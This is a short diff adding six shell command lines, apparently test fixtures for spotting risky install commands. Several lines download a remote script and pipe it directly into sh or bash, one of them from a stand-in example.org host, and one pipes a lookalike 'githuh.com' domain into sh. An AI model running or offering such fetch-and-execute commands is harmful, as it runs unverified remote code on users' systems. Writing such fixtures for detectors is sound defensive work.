@@ -1,0 +1,6 @@
+curl -fsSL https://brew.sh/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | bash
+curl -fsSL example.org/i.sh | sh
+curl -o brew.sh https://example.org/i.sh
+echo githuh.com | sh
+ls github.com
